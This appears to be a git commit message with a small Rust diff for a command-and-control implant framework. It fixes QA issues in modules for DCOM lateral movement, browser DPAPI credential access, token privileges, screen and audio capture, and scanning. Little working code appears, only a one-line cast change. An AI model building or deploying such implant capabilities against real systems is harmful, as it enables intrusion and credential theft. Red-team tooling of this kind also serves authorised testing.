fix: resolve 17 issues found during live implant QA testing
Live QA testing of all 30 task types against a Windows implant revealed
18 issues. This commit fixes 17 of them across server, operator, and
implant crates:

Critical/High fixes:
- Scan DNS resolve timeout (5s) prevents task queue hang on bad hostnames
- Sleep bounds validation (1-86400s) prevents implant lockout
- Task result display in operator (JSON decode for task show)
- Download command now saves files to disk with poll-wait loop
- ps command dispatches live process task instead of empty DB query
- InjectService auth fallback for insecure/dev mode
- Global 60s task execution timeout prevents queue blocking

Medium fixes:
- Screenshot desktop guard (OpenInputDesktop check) returns clean error
- Browser DPAPI 5s timeout wrapper prevents indefinite blocking
- Audio stub sleep loop replaced with instant buffer fill
- Registry forward-slash normalization (HKLM/SOFTWARE works)
- Token enable-priv checks GetLastError for ERROR_NOT_ALL_ASSIGNED
- Token list subcommand wired in CLI parser
- USB monitor and AD modules registered in implant registry
- cd command warns about CWD limitation instead of silent misbehavior
- Port range validation (1-65535) in scan module

+++ crates/implant-modules/mod-lateral/src/dcom.rs
@@ -94,7 +94,7 @@ fn execute_impl(task: &LateralDcom) -> Result<LateralResult, KrakenError> {
     };
 
     let hr = unsafe {
-        CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED);
+        CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED as u32);
         CoCreateInstanceEx(
             &clsid,
             std::ptr::null_mut(),
